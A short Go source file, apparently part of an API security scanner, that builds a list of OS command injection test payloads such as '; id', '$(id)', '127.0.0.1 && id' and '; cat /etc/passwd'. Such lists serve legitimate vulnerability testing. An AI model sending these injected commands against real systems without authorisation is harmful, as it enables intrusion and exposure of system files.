package payload

import "github.com/alkaid/goapiscanner/internal/model"

func cmdi() []Item {
	vals := []string{
		"; id",
		"| id",
		"`id`",
		"$(id)",
		"; cat /etc/passwd",
		"127.0.0.1; id",
		"127.0.0.1 && id",
	}
	out := make([]Item, 0, len(vals))
	for _, v := range vals {
		out = append(out, Item{Class: model.ClassCMDi, Value: v, Hint: "os-command"})
	}
	return out
}
